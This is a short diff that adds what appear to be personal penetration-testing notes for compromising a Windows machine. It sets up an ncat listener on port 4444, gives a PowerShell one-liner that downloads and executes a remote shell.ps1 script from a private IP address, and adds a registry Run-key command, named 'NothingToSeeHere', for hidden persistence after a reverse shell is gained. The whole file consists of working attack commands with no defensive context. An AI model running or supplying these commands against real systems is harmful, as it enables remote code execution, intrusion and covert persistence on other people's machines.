@@ -1,0 +1,5 @@
+ncat -l -p 4444
+powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.178:4444/shell.ps1')
+
+
+add persistence once we gained access with the reverseshell : reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run \V NothingToSeeHere -d "C:\Windows\System32\config.ps1" /F  
